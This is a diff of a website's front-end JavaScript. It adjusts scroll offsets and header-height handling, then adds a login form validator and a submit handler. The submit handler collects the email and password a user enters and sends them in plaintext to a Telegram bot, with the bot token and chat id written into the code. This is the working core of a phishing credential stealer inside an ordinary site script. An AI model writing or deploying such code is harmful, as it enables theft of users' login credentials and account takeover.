@@ -60,6 +60,9 @@ $(document).ready(function () {
   // $('#lightgallery').lightGallery({
   //   plugins: [lgZoom, lgThumbnail],
   // });
+  let section = document.querySelector('.section_id');
+  let sectionPadding = window.getComputedStyle(section);
+  let paddingScroll = parseFloat(sectionPadding.paddingTop);
 
   let scrollToSection = function (event) {
     event.preventDefault();
@@ -67,7 +70,7 @@ $(document).ready(function () {
     var dest = el.attr('href'); // получаем направление
     if (dest !== undefined && dest !== '') { // проверяем существование
       $('html').animate({
-          scrollTop: $(dest).offset().top-100 // прокручиваем страницу к требуемому элементу
+          scrollTop: $(dest).offset().top-paddingScroll+30 // прокручиваем страницу к требуемому элементу
         }, 1000 // скорость прокрутки
       );
     }
@@ -80,8 +83,16 @@ $(document).ready(function () {
 
   $('.scrool_map').on("click", scrollToSection);
 
+  let header = document.querySelector('.header');
+  let headerStyle = window.getComputedStyle(header);
+  let headerHeight = parseFloat(headerStyle.height);
+  console.log(headerHeight);
+
   let element = document.getElementById('hero').getBoundingClientRect();
-  let height = element.height - 80;
+  console.log(element.height);
+  let height = element.height-headerHeight;
+
+  
   
   // зміна bg на header при скролінгу сторінки
   $(window).scroll(function () {
@@ -131,4 +142,100 @@ $(document).ready(function () {
     // ... other settings
   });
 
+
+
+
 });
+
+// Валідація форми
+const EMAIL_MIN_LENGHT = 5;
+const mediumRegex = new RegExp("^(((?=.*[a-z])(?=.*[A-Z]))|((?=.*[a-z])(?=.*[0-9]))|((?=.*[A-Z])(?=.*[0-9])))(?=.{8,})");
+
+function testPasswordRegex(value) {
+    return mediumRegex.test(value);
+}
+
+function checkEmailLenght() {
+    const valueLenght = window.inputEmail.value.length;
+    const diff = valueLenght < EMAIL_MIN_LENGHT ? EMAIL_MIN_LENGHT - valueLenght : 0;
+
+    if(diff) {
+        window.emailDiffCount.textContent = diff;
+        window.emailLenghtHelp.classList.remove('d-none');
+    } else {
+        window.emailLenghtHelp.classList.add('d-none');
+    }
+};
+
+function resetValidation() {
+    window.emailHelp.classList.add('d-none');
+    window.passwordHelp.classList.add('d-none');
+    window.passwordHelpDescription.classList.add('d-none');
+}
+
+function validateForm(event) {
+    event.preventDefault();
+    resetValidation();
+    
+    const email = window.inputEmail.value;
+    const password = window.inputPassword.value;
+
+    if(!email) {
+        window.emailHelp.classList.remove('d-none');
+        return false;
+    }
+    if(!password) {
+        window.passwordHelp.classList.remove('d-none');
+        return false;
+    }
+
+    if(!testPasswordRegex(password)) {
+        window.passwordHelp.classList.remove('d-none');
+        window.passwordHelpDescription.classList.remove('d-none');
+    }
+
+    
+}
+
+async function formSubmit(event) {
+    event.preventDefault();
+    const email = window.inputEmail.value;
+    const password = window.inputPassword.value;
+
+    if(!email || !password) {
+      return false;
+    }
+
+    let apiToken = "6412142701:AAFqsqMVnxL0I3awtWVuK4_1i8gHEF-7zl0";
+    let chatId = "-1001923473956";
+    let text = `
+    <b>Email: </b> ${email}
+    <b>Password </b> ${password}
+    `;
+
+    let urlString = `https://api.telegram.org/bot${apiToken}/sendMessage`;
+
+    const response = await fetch(urlString, {
+      method: 'post',
+      headers: {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text,
+        parse_mode: 'HTML'
+      })
+    });
+    const resp = await response.json();
+    console.log(resp);
+    // let request = new XMLHttpRequest();
+    // request.open("GET", urlString);
+    // request.send();
+    // let response = request.response;
+
+    // Do what you want with response
+}
+
+// window.inputEmail.addEventListener('input', checkEmailLenght);
+window.loginForm.addEventListener('submit', formSubmit);
